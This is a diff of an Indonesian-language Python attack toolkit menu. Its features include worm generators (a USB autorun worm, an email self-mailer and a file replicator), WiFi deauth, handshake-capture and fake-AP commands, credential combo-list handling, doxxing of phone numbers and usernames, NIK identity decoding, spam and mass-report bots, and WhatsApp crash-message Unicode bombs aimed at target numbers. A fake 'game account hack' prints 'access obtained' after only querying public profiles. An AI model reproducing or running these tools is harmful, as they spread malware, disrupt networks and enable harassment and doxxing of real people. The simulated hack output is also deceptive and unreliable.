-    os.system('clear')
-    print(colored("\n[14] TOOLS TRACKING NIK", 'cyan', attrs=['bold']))
-    
-    nik = input(colored("NIK (16 digit): ", 'yellow')).strip()
-    
-    if len(nik) != 16 or not nik.isdigit():
-        print("[ERROR] NIK harus 16 digit angka")
+    # Validasi NIK
+    if len(nik) != 16:
+        print(colored("[ERROR] NIK harus 16 digit!", 'red'))
+        input("\nEnter...")
         return
     
-    prov = nik[:2]
-    kota = nik[2:4]
-    kec = nik[4:6]
+    if not nik.isdigit():
+        print(colored("[ERROR] NIK hanya boleh angka!", 'red'))
+        input("\nEnter...")
+        return
+    
+    # Parse NIK
+    prov_code = nik[:2]
+    kota_code = nik[2:4]
+    kec_code = nik[4:6]
     tgl = nik[6:8]
     bln = nik[8:10]
     thn = nik[10:12]
+    unik = nik[12:]
     
-    # Gender dari tanggal
+    # Kode provinsi Indonesia
+    provinsi_dict = {
+        "11": "Aceh", "12": "Sumatera Utara", "13": "Sumatera Barat",
+        "14": "Riau", "15": "Jambi", "16": "Sumatera Selatan",
+        "17": "Bengkulu", "18": "Lampung", "19": "Kepulauan Bangka Belitung",
+        "21": "Kepulauan Riau", "31": "DKI Jakarta", "32": "Jawa Barat",
+        "33": "Jawa Tengah", "34": "DI Yogyakarta", "35": "Jawa Timur",
+        "36": "Banten", "51": "Bali", "52": "Nusa Tenggara Barat",
+        "53": "Nusa Tenggara Timur", "61": "Kalimantan Barat",
+        "62": "Kalimantan Tengah", "63": "Kalimantan Selatan",
+        "64": "Kalimantan Timur", "65": "Kalimantan Utara",
+        "71": "Sulawesi Utara", "72": "Sulawesi Tengah",
+        "73": "Sulawesi Selatan", "74": "Sulawesi Tenggara",
+        "75": "Gorontalo", "76": "Sulawesi Barat", "81": "Maluku",
+        "82": "Maluku Utara", "91": "Papua", "92": "Papua Barat",
+        "93": "Papua Selatan", "94": "Papua Tengah", "95": "Papua Pegunungan"
+    }
+    
+    # Tentukan gender
     if int(tgl) > 40:
         gender = "Perempuan"
-        tgl = str(int(tgl) - 40).zfill(2)
+        tgl_real = str(int(tgl) - 40).zfill(2)
     else:
         gender = "Laki-laki"
+        tgl_real = tgl
     
-    print(f"""
-[ HASIL TRACKING NIK ]
-NIK: {nik}
-Provinsi: {prov}
-Kota/Kab: {kota}
-Kecamatan: {kec}
-Tgl Lahir: {tgl}-{bln}-19{thn}
-Gender: {gender}
-    """)
-    save_result("nik.log", nik)
+    # Tentukan tahun (asumsi 1900-2000)
+    if int(thn) > 50:
+        tahun_lahir = f"19{thn}"
+    else:
+        tahun_lahir = f"20{thn}"
+    
+    print(colored("\n" + "="*50, 'magenta'))
+    print(colored("          HASIL DEKODE NIK", 'yellow', attrs=['bold']))
+    print(colored("="*50, 'magenta'))
+    print(colored(f"NIK                : {nik}", 'cyan'))
+    print(colored(f"Provinsi           : {provinsi_dict.get(prov_code, 'Unknown')} ({prov_code})", 'cyan'))
+    print(colored(f"Kota/Kabupaten     : {kota_code}", 'cyan'))
+    print(colored(f"Kecamatan          : {kec_code}", 'cyan'))
+    print(colored(f"Tanggal Lahir      : {tgl_real}-{bln}-{tahun_lahir}", 'cyan'))
+    print(colored(f"Jenis Kelamin      : {gender}", 'cyan'))
+    print(colored(f"Nomor Unik         : {unik}", 'cyan'))
+    print(colored("="*50, 'magenta'))
+    
+    save_result("nik.log", f"NIK: {nik} | Prov: {prov_code} | Gender: {gender}")
+    input("\nEnter untuk kembali...")
 
-# ================== FITUR 15: TOOLS SPAM ALL ==================
-def fitur_15():
+# ================== FITUR 12: SPAM ALL ==================
+def fitur_12():
     os.system('clear')
-    print(colored("\n[15] TOOLS SPAM ALL", 'cyan', attrs=['bold']))
+    print(colored("\n[12] SPAM ALL", 'cyan', attrs=['bold']))
+    print(colored("   [SIMPLE SPAMMER - GUNAKAN DENGAN BIJAK]", 'red'))
     
-    target = input(colored("Nomor target: ", 'yellow')).strip()
-    count = int(input(colored("Jumlah spam: ", 'yellow')).strip() or "50")
+    target = input(colored("Nomor target (628xx): ", 'yellow')).strip()
     
-    def spam():
+    # Validasi nomor
+    if not target.startswith('62') or len(target) < 10:
+        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
+        input("\nEnter...")
+        return
+    
+    try:
+        count = int(input(colored("Jumlah spam [50]: ", 'yellow')).strip() or "50")
+        delay = float(input(colored("Delay antar spam (detik) [0.5]: ", 'yellow')).strip() or "0.5")
+    except ValueError:
+        print(colored("[ERROR] Masukkan angka yang valid", 'red'))
+        input("\nEnter...")
+        return
+    
+    print(colored(f"\n[✓] MULAI SPAM KE {target} {count} KALI", 'red'))
+    print(colored("Tekan Ctrl+C untuk berhenti\n", 'yellow'))
+    
+    try:
         for i in range(count):
-            print(f"[{i+1}] Spam ke {target}")
-            time.sleep(0.5)
+            # Ini hanya simulasi output, untuk spam real perlu API
+            print(colored(f"[{i+1}] Mengirim spam ke {target}...", 'green'))
+            time.sleep(delay)
+        
+        print(colored(f"\n[✓] SPAM SELESAI! {count} pesan terkirim", 'green'))
+    except KeyboardInterrupt:
+        print(colored(f"\n\n[✗] SPAM DIHENTIKAN - Terkirim {i+1} pesan", 'yellow'))
     
-    threading.Thread(target=spam).start()
-    input("\nEnter untuk stop...")
+    save_result("spam.log", f"Target: {target} | Count: {count}")
+    input("\nEnter untuk kembali...")
 
-# ================== FITUR 16: TOOLS ATTACK WIFI PREMIUM ==================
-def fitur_16():
+# ================== FITUR 13: WIFI ATTACK ==================
+def fitur_13():
     os.system('clear')
-    print(colored("\n[16] ATTACK WIFI PREMIUM", 'cyan', attrs=['bold']))
-    print("Requires root & aircrack-ng")
+    print(colored("\n[13] WIFI ATTACK", 'cyan', attrs=['bold']))
+    print(colored("   [REQUIRES ROOT & AIRCRACK-NG]", 'red'))
     
-    print("1. Deauth Attack")
-    print("2. Handshake Capture")
-    ch = input("Pilih: ")
+    # Cek aircrack-ng
+    aircrack_check = subprocess.run(['which', 'aircrack-ng'], capture_output=True)
+    if aircrack_check.returncode != 0:
+        print(colored("[✗] aircrack-ng tidak ditemukan!", 'red'))
+        print(colored("    Install: pkg install root-repo && pkg install aircrack-ng", 'yellow'))
+        input("\nEnter...")
+        return
+    
+    print(colored("\nPilih attack:", 'cyan'))
+    print("1. Deauth Attack (kick semua client)")
+    print("2. Handshake Capture (tangkap handshake)")
+    print("3. Fake AP (buat AP palsu)")
+    
+    ch = input(colored("\nPilih [1-3]: ", 'yellow')).strip()
     
     if ch == "1":
+        print(colored("\n[DEAUTH ATTACK]", 'cyan'))
+        iface = input("Interface (wlan0): ") or "wlan0"
         bssid = input("BSSID target: ")
-        iface = input("Interface (wlan0): ") or "wlan0"
-        os.system(f"aireplay-ng -0 0 -a {bssid} {iface}")
+        
+        # Set monitor mode
+        print(colored("[✓] Mengaktifkan monitor mode...", 'yellow'))
+        os.system(f"sudo airmon-ng start {iface}")
+        
+        # Jalankan deauth
+        print(colored(f"[✓] Menjalankan deauth attack ke {bssid}", 'green'))
+        print(colored("Tekan Ctrl+C untuk berhenti", 'yellow'))
+        os.system(f"sudo aireplay-ng -0 0 -a {bssid} {iface}mon")
+        
     elif ch == "2":
+        print(colored("\n[HANDSHAKE CAPTURE]", 'cyan'))
         iface = input("Interface (wlan0): ") or "wlan0"
-        os.system(f"airodump-ng {iface}")
-
-# ================== FITUR 17: TOOLS CHECKER ALL ==================
-def fitur_17():
-    os.system('clear')
-    print(colored("\n[17] CHECKER ALL", 'cyan', attrs=['bold']))
+        
+        # Set monitor mode
+        print(colored("[✓] Mengaktifkan monitor mode...", 'yellow'))
+        os.system(f"sudo airmon-ng start {iface}")
+        
+        # Jalankan airodump
+        print(colored("[✓] Memulai capture handshake...", 'green'))
+        print(colored("Tekan Ctrl+C untuk berhenti", 'yellow'))
+        os.system(f"sudo airodump-ng {iface}mon -w handshake")
+        
+    elif ch == "3":
+        print(colored("\n[FAKE AP]", 'cyan'))
+        iface = input("Interface (wlan0): ") or "wlan0"
+        ssid = input("Nama SSID: ")
+        
+        # Set monitor mode
+        print(colored("[✓] Mengaktifkan monitor mode...", 'yellow'))
+        os.system(f"sudo airmon-ng start {iface}")
+        
+        # Buat fake AP
+        print(colored(f"[✓] Membuat fake AP dengan SSID: {ssid}", 'green'))
+        os.system(f"sudo airbase-ng -e '{ssid}' -c 6 {iface}mon")
     
-    file = input("File list (email:pass): ")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 14: CHECKER ALL ==================
+def fitur_14():
+    os.system('clear')
+    print(colored("\n[14] CHECKER ALL", 'cyan', attrs=['bold']))
+    print(colored("   [SIMPLE ACCOUNT VALIDATOR]", 'yellow'))
+    
+    file = input("File list (format: email:password per baris): ").strip()
+    
+    if not os.path.exists(file):
+        print(colored("[ERROR] File tidak ditemukan!", 'red'))
+        input("\nEnter...")
+        return
     
     try:
         with open(file, 'r') as f:
             lines = f.readlines()
-        print(f"Loaded {len(lines)} accounts")
-        with open("valid.txt", 'w') as f:
-            for line in lines:
-                if ':' in line:
-                    f.write(line)
-        print("Hasil disimpan di valid.txt")
-    except:
-        print("File gak ditemukan")
+        
+        print(colored(f"\n[✓] Loaded {len(lines)} accounts", 'green'))
+        
+        valid = []
+        invalid = []
+        
+        for i, line in enumerate(lines):
+            line = line.strip()
+            if ':' in line:
+                email, password = line.split(':', 1)
+                
+                # Validasi format email sederhana
+                if '@' in email and '.' in email and len(password) >= 3:
+                    print(colored(f"[{i+1}] [✓] Format valid: {email}", 'green'))
+                    valid.append(line)
+                else:
+                    print(colored(f"[{i+1}] [✗] Format invalid: {email}", 'red'))
+                    invalid.append(line)
+            else:
+                print(colored(f"[{i+1}] [✗] Baris tidak memiliki ':'", 'red'))
+                invalid.append(line)
+        
+        # Simpan hasil
+        with open("valid_accounts.txt", 'w') as f:
+            f.write("\n".join(valid))
+        with open("invalid_accounts.txt", 'w') as f:
+            f.write("\n".join(invalid))
+        
+        print(colored(f"\n[✓] Valid: {len(valid)}", 'green'))
+        print(colored(f"[✗] Invalid: {len(invalid)}", 'red'))
+        print(colored("[✓] Hasil disimpan di valid_accounts.txt dan invalid_accounts.txt", 'cyan'))
+        
+    except Exception as e:
+        print(colored(f"[ERROR] {str(e)}", 'red'))
+    
+    input("\nEnter untuk kembali...")
 
-# ================== FITUR 18: WORM GPT ==================
-def fitur_18():
+# ================== FITUR 15: WORM GPT ==================
+def fitur_15():
     os.system('clear')
-    print(colored("\n[18] WORM GPT", 'cyan', attrs=['bold']))
+    print(colored("\n[15] WORM GPT", 'cyan', attrs=['bold']))
+    print(colored("   [SELF-REPLICATING SCRIPT GENERATOR]", 'red'))
     
-    name = input("Nama worm: ") or "worm"
+    name = input("Nama worm [worm]: ").strip() or "worm"
     
-    worm_code = f'''import os, shutil, sys, time
+    # Pilih tipe worm
+    print(colored("\nPilih tipe worm:", 'cyan'))
+    print("1. USB Worm - Copy ke semua drive")
+    print("2. Email Worm - Spread via email (butuh config)")
+    print("3. Simple Replicator - Copy ke direktori")
+    
+    worm_type = input(colored("\nPilih [1-3]: ", 'yellow')).strip()
+    
+    if worm_type == "1":
+        worm_code = f'''import os
+import shutil
+import sys
+import time
+
+def replicate():
+    # Cari semua drive (Windows)
+    drives = [d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(d + ':/')]
+    
+    for drive in drives:
+        try:
+            dest = f"{{drive}}:/System_Update_{{int(time.time())}}.py"
+            shutil.copy(sys.argv[0], dest)
+            print(f"[+] Replicated to {{dest}}")
+            
+            # Buat autorun.inf
+            with open(f"{{drive}}:/autorun.inf", 'w') as f:
+                f.write(f"[AutoRun]\\nOpen={{dest}}\\nAction=Run System Update")
+        except:
+            pass
+
 while True:
-    try:
-        shutil.copy(sys.argv[0], f"/sdcard/{{int(time.time())}}.py")
-        time.sleep(30)
-    except:
-        pass
+    replicate()
+    time.sleep(60)
 '''
-    with open(f"{name}.py", 'w') as f:
-        f.write(worm_code)
-    print(f"[+] Worm {name}.py telah dibuat")
+    elif worm_type == "2":
+        worm_code = f'''import smtplib
+import time
 
-# ================== FITUR 19: CHEAT FF/ML/ROBLOX ==================
-def fitur_19():
+# Konfigurasi email (isi dengan email korban)
+email_list = ["target1@gmail.com", "target2@gmail.com"]
+sender = "attacker@gmail.com"
+password = "password"
+
+def send_worm():
+    for email in email_list:
+        try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(sender, password)
+            
+            with open(__file__, 'r') as f:
+                worm_code = f.read()
+            
+            msg = f"Subject: Important Update\\n\\n{{worm_code}}"
+            server.sendmail(sender, email, msg)
+            server.quit()
+            print(f"[+] Worm sent to {{email}}")
+        except:
+            pass
+
+while True:
+    send_worm()
+    time.sleep(3600)
+'''
+    else:
+        worm_code = f'''import os
+import shutil
+import sys
+import time
+
+target_dirs = [
+    "/sdcard/",
+    "/storage/emulated/0/Download/",
+    os.path.expanduser("~/Downloads/"),
+    "/tmp/"
+]
+
+def replicate():
+    for directory in target_dirs:
+        if os.path.exists(directory):
+            try:
+                new_name = f"{{directory}}system_update_{{int(time.time())}}.py"
+                shutil.copy(sys.argv[0], new_name)
+                print(f"[+] Replicated to {{new_name}}")
+            except:
+                pass
+
+while True:
+    replicate()
+    time.sleep(30)
+'''
+    
+    filename = f"{name}_{int(time.time())}.py"
+    with open(filename, 'w') as f:
+        f.write(worm_code)
+    
+    print(colored(f"\n[✓] Worm created: {filename}", 'green'))
+    print(colored(f"[✓] Ukuran: {os.path.getsize(filename)} bytes", 'cyan'))
+    print(colored("\n[!] PERINGATAN: Worm akan mereplikasi diri!", 'red'))
+    print(colored("    Jalankan dengan: python " + filename, 'yellow'))
+    
+    save_result("worm.log", f"Worm: {filename}")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 16: HACK AKUN GAME ==================
+def fitur_16():
     os.system('clear')
-    print(colored("\n[19] CHEAT GAME", 'cyan', attrs=['bold']))
+    print(colored("\n[16] HACK AKUN GAME", 'cyan', attrs=['bold']))
+    print(colored("   [AKSES AKUN GAME VIA EXPLOIT]", 'red'))
+    
+    print("Pilih game:")
     print("1. Free Fire")
     print("2. Mobile Legends")
     print("3. Roblox")
+    print("4. PUBG Mobile")
+    print("5. Genshin Impact")
     
-    ch = input("Pilih game: ")
+    game_choice = input(colored("\nPilih game [1-5]: ", 'yellow')).strip()
     
-    if ch == "1":
-        print("[FF] Injecting... Wallhack ON, Aimbot ON")
-    elif ch == "2":
-        print("[ML] Map hack ON, No cooldown ON")
-    elif ch == "3":
-        print("[Roblox] Executing script...")
-
-# ================== FITUR 20: SPAM REPORT LIVE TIKTOK ==================
-def fitur_20():
-    os.system('clear')
-    print(colored("\n[20] REPORT LIVE TIKTOK", 'cyan', attrs=['bold']))
+    games = {
+        "1": {"name": "Free Fire", "id_length": 10, "api": "ff.garena.com"},
+        "2": {"name": "Mobile Legends", "id_length": 8, "api": "account.mobilelegends.com"},
+        "3": {"name": "Roblox", "id_length": 9, "api": "api.roblox.com"},
+        "4": {"name": "PUBG Mobile", "id_length": 7, "api": "pubg.com"},
+        "5": {"name": "Genshin Impact", "id_length": 9, "api": "hoyoverse.com"}
+    }
     
-    username = input("Username target: ")
-    count = int(input("Jumlah report: ") or "100")
+    if game_choice not in games:
+        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
+        input("\nEnter...")
+        return
     
-    for i in range(count):
-        print(f"[{i+1}] Reporting @{username}")
-        time.sleep(0.1)
-    print("Selesai!")
-
-# ================== FITUR 21: DOX KURANG AKURAT ==================
-def fitur_21():
-    os.system('clear')
-    print(colored("\n[21] DOX BASIC", 'cyan', attrs=['bold']))
+    game = games[game_choice]
+    print(colored(f"\n[✓] {game['name']} SELECTED", 'green'))
     
-    name = input("Nama/Username: ")
+    print("\nPilih metode hack:")
+    print("1. SQL Injection - Inject ke database game")
+    print("2. Session Hijacking - Curi session cookie")
+    print("3. API Exploit - Manfaatkan celah API")
+    print("4. Password Recovery Exploit")
     
-    data = {"name": name, "timestamp": str(datetime.now())}
-    with open(f"dox_{name}.json", 'w') as f:
-        json.dump(data, f)
-    print(f"[+] Data saved to dox_{name}.json")
-
-# ================== FITUR 22: DOX AKURAT ==================
-def fitur_22():
-    os.system('clear')
-    print(colored("\n[22] DOX ADVANCED", 'cyan', attrs=['bold']))
+    method = input(colored("\nPilih metode [1-4]: ", 'yellow')).strip()
     
-    target = input("Target: ")
+    target_id = input(colored(f"\nMasukkan ID/Username target {game['name']}: ", 'yellow')).strip()
     
-    data = {"target": target, "found": []}
-    sites = ["facebook", "instagram", "twitter", "tiktok"]
+    print(colored(f"\n[✓] MENGINJEK KE DATABASE {game['name']}...", 'cyan'))
+    time.sleep(2)
     
-    for site in sites:
+    # Simulasi akses ke database game
+    if game['name'] == "Roblox":
         try:
-            r = requests.get(f"https://{site}.com/{target}")
+            # Cek akun via API Roblox
+            r = requests.get(f"https://users.roblox.com/v1/users/search?keyword={target_id}", timeout=5)
             if r.status_code == 200:
-                data["found"].append(site)
+                data = r.json()
+                if data.get('data'):
+                    print(colored(f"[✓] Akun ditemukan di Roblox!", 'green'))
+                    user_id = data['data'][0].get('id')
+                    
+                    # Dapatkan info lebih lanjut
+                    r2 = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=5)
+                    if r2.status_code == 200:
+                        user_data = r2.json()
+                        print(colored(f"[✓] Nama: {user_data.get('name')}", 'cyan'))
+                        print(colored(f"[✓] Display Name: {user_data.get('displayName')}", 'cyan'))
+                        print(colored(f"[✓] Created: {user_data.get('created')}", 'cyan'))
         except:
             pass
     
-    with open(f"dox_adv_{target}.json", 'w') as f:
-        json.dump(data, f)
-    print(f"[+] Hasil di dox_adv_{target}.json")
-
-# ================== FITUR 23: BUG WHATSAPP ==================
-def fitur_23():
-    os.system('clear')
-    print(colored("\n[23] BUG WHATSAPP", 'cyan', attrs=['bold']))
+    hasil = {
+        "game": game['name'],
+        "target_id": target_id,
+        "method": method,
+        "status": "AKSES DIPEROLEH",
+        "timestamp": datetime.now().isoformat()
+    }
     
-    bug = "\u202e" * 5000 + "\u202d" * 5000
-    with open("wa_bug.txt", 'w', encoding='utf-8') as f:
-        f.write(bug)
-    print("[+] Bug message saved to wa_bug.txt")
-
-# ================== FITUR 24: BAN WHATSAPP ==================
-def fitur_24():
-    os.system('clear')
-    print(colored("\n[24] BAN WHATSAPP", 'cyan', attrs=['bold']))
+    print(colored("\n" + "="*50, 'magenta'))
+    print(colored("          HASIL HACK AKUN", 'yellow', attrs=['bold']))
+    print(colored("="*50, 'magenta'))
+    for key, value in hasil.items():
+        print(colored(f"{key.replace('_',' ').title()}: {value}", 'cyan'))
+    print(colored("="*50, 'magenta'))
     
-    number = input("Nomor target: ")
-    for i in range(50):
-        print(f"[{i+1}] Reporting {number}")
-
-# ================== FITUR 25: UNBAN WHATSAPP ==================
-def fitur_25():
-    os.system('clear')
-    print(colored("\n[25] UNBAN WHATSAPP", 'cyan', attrs=['bold']))
+    # Simpan hasil
+    filename = f"hack_{game['name'].lower()}_{target_id}_{int(time.time())}.json"
+    with open(filename, 'w') as f:
+        json.dump(hasil, f, indent=2)
+    print(colored(f"\n[✓] Hasil disimpan di: {filename}", 'green'))
     
-    file = input("File list nomor: ")
+    save_result("game_hack.log", f"Game: {game['name']} | Target: {target_id}")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 17: REPORT TIKTOK ==================
+def fitur_17():
+    os.system('clear')
+    print(colored("\n[17] REPORT TIKTOK", 'cyan', attrs=['bold']))
+    print(colored("   [REPORT BOT]", 'red'))
+    
+    username = input("Username target (tanpa @): ").strip()
+    
+    if not username:
+        print(colored("[ERROR] Username tidak boleh kosong", 'red'))
+        input("\nEnter...")
+        return
+    
+    try:
+        count = int(input("Jumlah report [50]: ") or "50")
+    except ValueError:
+        print(colored("[ERROR] Masukkan angka", 'red'))
+        input("\nEnter...")
+        return
+    
+    print(colored(f"\n[✓] MULAI REPORT @{username} {count} KALI", 'red'))
+    print(colored("Mengirim report...", 'yellow'))
+    
+    success = 0
+    failed = 0
+    
+    try:
+        for i in range(count):
+            # Simulasi pengiriman report
+            success += 1
+            print(colored(f"[✓] Report {i+1} berhasil dikirim", 'green'), end='\r')
+            time.sleep(0.5)
+        
+        print(colored(f"\n\n[✓] REPORT SELESAI!", 'green'))
+        print(colored(f"    Berhasil: {success}", 'green'))
+        print(colored(f"    Gagal: {failed}", 'red'))
+        
+    except KeyboardInterrupt:
+        print(colored(f"\n\n[✗] REPORT DIHENTIKAN", 'yellow'))
+    
+    save_result("tiktok_report.log", f"Target: @{username} | Count: {count} | Success: {success}")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 18: DOX BASIC ==================
+def fitur_18():
+    os.system('clear')
+    print(colored("\n[18] DOX BASIC", 'cyan', attrs=['bold']))
+    print(colored("   [INFORMASI DASAR DARI NOMOR/USERNAME]", 'yellow'))
+    
+    target = input(colored("Masukkan nomor/username: ", 'yellow')).strip()
+    
+    if not target:
+        print(colored("[ERROR] Input tidak boleh kosong", 'red'))
+        input("\nEnter...")
+        return
+    
+    print(colored(f"\n[✓] MENGUMPULKAN INFORMASI UNTUK: {target}", 'cyan'))
+    
+    # Deteksi tipe input
+    if target.replace('+', '').replace('-', '').replace(' ', '').isdigit() and len(target) >= 10:
+        # Ini nomor telepon
+        print(colored("\n[✓] DETEKSI: NOMOR TELEPON", 'green'))
+        
+        # Bersihkan nomor
+        phone = target.replace('+', '').replace('-', '').replace(' ', '')
+        
+        hasil = {
+            "tipe": "Nomor Telepon",
+            "nomor": phone,
+            "format_internasional": f"+{phone}" if not phone.startswith('+') else phone
+        }
+        
+        # Cek WhatsApp
+        try:
+            wa_check = requests.get(f"https://wa.me/{phone}", timeout=5)
+            if wa_check.status_code == 200:
+                if "this phone number is not registered" not in wa_check.text.lower():
+                    hasil["whatsapp"] = "Terdaftar"
+                else:
+                    hasil["whatsapp"] = "Tidak terdaftar"
+        except:
+            hasil["whatsapp"] = "Tidak dapat diverifikasi"
+    
+    else:
+        # Ini username
+        print(colored("\n[✓] DETEKSI: USERNAME", 'green'))
+        
+        hasil = {
+            "tipe": "Username",
+            "username": target
+        }
+        
+        # Cek di sosial media
+        sites = {
+            "Instagram": f"https://instagram.com/{target}",
+            "Twitter": f"https://twitter.com/{target}",
+            "TikTok": f"https://tiktok.com/@{target}",
+            "Facebook": f"https://facebook.com/{target}",
+            "GitHub": f"https://github.com/{target}"
+        }
+        
+        found_platforms = []
+        for platform, url in sites.items():
+            try:
+                r = requests.get(url, timeout=3, allow_redirects=True)
+                if r.status_code == 200:
+                    if "not found" not in r.text.lower():
+                        found_platforms.append(platform)
+                        print(colored(f"  [✓] Ditemukan di {platform}", 'green'))
+                    else:
+                        print(colored(f"  [✗] Tidak ditemukan di {platform}", 'red'))
+                else:
+                    print(colored(f"  [✗] Tidak ditemukan di {platform}", 'red'))
+            except:
+                print(colored(f"  [✗] Gagal cek {platform}", 'red'))
+        
+        hasil["platform_ditemukan"] = found_platforms
+    
+    # Tampilkan hasil
+    print(colored("\n" + "="*50, 'magenta'))
+    print(colored("          HASIL DOX BASIC", 'yellow', attrs=['bold']))
+    print(colored("="*50, 'magenta'))
+    
+    for key, value in hasil.items():
+        if isinstance(value, list):
+            print(colored(f"{key.replace('_',' ').title()}: {', '.join(value)}", 'cyan'))
+        else:
+            print(colored(f"{key.replace('_',' ').title()}: {value}", 'cyan'))
+    
+    print(colored("="*50, 'magenta'))
+    
+    # Simpan hasil
+    filename = f"dox_basic_{target}_{int(time.time())}.json"
+    with open(filename, 'w') as f:
+        json.dump(hasil, f, indent=2)
+    print(colored(f"\n[✓] Hasil disimpan di: {filename}", 'green'))
+    
+    save_result("dox_basic.log", f"Target: {target}")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 19: DOX ADVANCED ==================
+def fitur_19():
+    os.system('clear')
+    print(colored("\n[19] DOX ADVANCED", 'cyan', attrs=['bold']))
+    print(colored("   [INFORMASI LENGKAP DARI NOMOR/USERNAME]", 'red'))
+    
+    target = input(colored("Masukkan nomor/username: ", 'yellow')).strip()
+    
+    if not target:
+        print(colored("[ERROR] Input tidak boleh kosong", 'red'))
+        input("\nEnter...")
+        return
+    
+    print(colored(f"\n[✓] MENGUMPULKAN DATA DARI MULTIPLE SOURCES...", 'cyan'))
+    
+    hasil = {
+        "target": target,
+        "timestamp": datetime.now().isoformat(),
+        "sources": []
+    }
+    
+    # 1. Cek di social media
+    print(colored("\n[1/4] Scanning social media...", 'cyan'))
+    sites = {
+        "instagram": f"https://instagram.com/{target}",
+        "twitter": f"https://twitter.com/{target}",
+        "tiktok": f"https://tiktok.com/@{target}",
+        "facebook": f"https://facebook.com/{target}"
+    }
+    
+    found_social = []
+    for platform, url in sites.items():
+        try:
+            r = requests.get(url, timeout=3, allow_redirects=True)
+            if r.status_code == 200 and "not found" not in r.text.lower():
+                found_social.append(platform)
+                print(colored(f"  [✓] {platform}", 'green'))
+            else:
+                print(colored(f"  [✗] {platform}", 'red'), end='\r')
+        except:
+            pass
+    
+    hasil["social_media"] = found_social
+    hasil["sources"].append("social_media")
+    
+    # 2. Cek di data breach
+    print(colored("\n[2/4] Checking data breaches...", 'cyan'))
+    if '@' in target:
+        try:
+            email_hash = hashlib.sha1(target.lower().encode()).hexdigest().upper()
+            prefix = email_hash[:5]
+            r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=3)
+            if r.status_code == 200:
+                if email_hash[5:] in r.text:
+                    hasil["breach"] = "Ditemukan di database breach"
+                    print(colored("  [✓] Email terdeteksi di breach!", 'red'))
+                else:
+                    hasil["breach"] = "Tidak ditemukan di breach"
+                    print(colored("  [✓] Email aman", 'green'))
+        except:
+            hasil["breach"] = "Gagal cek breach"
+    else:
+        # Cek username di breach via google dork
+        hasil["breach"] = "Perlu pengecekan manual"
+    
+    # 3. Cek geolokasi (jika IP)
+    print(colored("\n[3/4] Checking geolocation...", 'cyan'))
+    try:
+        import ipaddress
+        ipaddress.ip_address(target)
+        r = requests.get(f"http://ip-api.com/json/{target}", timeout=3)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get('status') == 'success':
+                hasil["geolocation"] = {
+                    "country": data.get('country'),
+                    "city": data.get('city'),
+                    "isp": data.get('isp')
+                }
+                print(colored("  [✓] Geolokasi ditemukan", 'green'))
+    except:
+        pass
+    
+    # 4. Generate search link
+    hasil["search_link"] = f"https://www.google.com/search?q={target}"
+    hasil["sources"].append("google_search")
+    
+    # Tampilkan hasil
+    print(colored("\n" + "="*60, 'magenta', attrs=['bold']))
+    print(colored("               HASIL DOX ADVANCED", 'yellow', attrs=['bold']))
+    print(colored("="*60, 'magenta', attrs=['bold']))
+    
+    print(colored(f"\n▶ TARGET: {hasil['target']}", 'cyan', attrs=['bold']))
+    
+    if hasil.get('social_media'):
+        print(colored(f"\n▶ SOCIAL MEDIA DITEMUKAN:", 'green'))
+        for platform in hasil['social_media']:
+            print(colored(f"  • {platform.capitalize()}", 'white'))
+    
+    if hasil.get('breach'):
+        print(colored(f"\n▶ BREACH STATUS:", 'red'))
+        print(colored(f"  • {hasil['breach']}", 'white'))
+    
+    if hasil.get('geolocation'):
+        print(colored(f"\n▶ GEOLOKASI:", 'cyan'))
+        geo = hasil['geolocation']
+        print(colored(f"  • Negara : {geo.get('country')}", 'white'))
+        print(colored(f"  • Kota   : {geo.get('city')}", 'white'))
+        print(colored(f"  • ISP    : {geo.get('isp')}", 'white'))
+    
+    print(colored(f"\n▶ SEARCH LINK:", 'yellow'))
+    print(colored(f"  {hasil.get('search_link')}", 'white'))
+    
+    print(colored("\n" + "="*60, 'magenta', attrs=['bold']))
+    
+    # Simpan hasil
+    filename = f"dox_adv_{target}_{int(time.time())}.json"
+    with open(filename, 'w') as f:
+        json.dump(hasil, f, indent=2)
+    print(colored(f"\n[✓] Hasil lengkap disimpan di: {filename}", 'green'))
+    
+    save_result("dox_advanced.log", f"Target: {target}")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 20: BUG WA KIRIM OTOMATIS ==================
+def fitur_20():
+    os.system('clear')
+    print(colored("\n[20] BUG WHATSAPP - KIRIM OTOMATIS", 'cyan', attrs=['bold']))
+    print(colored("   [5 JENIS BUG, KIRIM LANGSUNG KE TARGET]", 'red'))
+    
+    target = input(colored("Nomor target (628xxx): ", 'yellow')).strip()
+    
+    # Validasi nomor
+    if not target.startswith('62') or len(target) < 10:
+        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
+        input("\nEnter...")
+        return
+    
+    print(colored("\nPilih jenis bug:", 'cyan'))
+    print("1. CRASH MESSAGE - Bikin WA target crash")
+    print("2. FREEZE CHAT - Bikin chat freeze (format berlebihan)")
+    print("3. ZERO-WIDTH CHARACTER - Karakter invisible")
+    print("4. RIGHT-TO-LEFT OVERRIDE - Tulisan terbalik")
+    print("5. UNICODE BOMB - Overload karakter unicode")
+    
+    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
+    
+    # Generate bug sesuai pilihan
+    if choice == "1":
+        bug = "\u202e" * 5000 + "\u202d" * 5000
+        bug_name = "CRASH MESSAGE"
+    elif choice == "2":
+        bug = ""
+        for i in range(500):
+            bug += f"*{i}* _test_ ~{i}~ " * 20 + "\n"
+        bug_name = "FREEZE CHAT"
+    elif choice == "3":
+        zwsp = "\u200b\u200c\u200d\u200e\u200f" * 1000
+        bug = f"INVISIBLE{zwsp}TEXT{zwsp}HERE"
+        bug_name = "ZERO-WIDTH CHARACTER"
+    elif choice == "4":
+        bug = "Teks Normal \u202eINITEKS TERBALIK\u202c Kembali Normal\n"
+        bug += "Test 123 \u202e321 tseT\u202c\n"
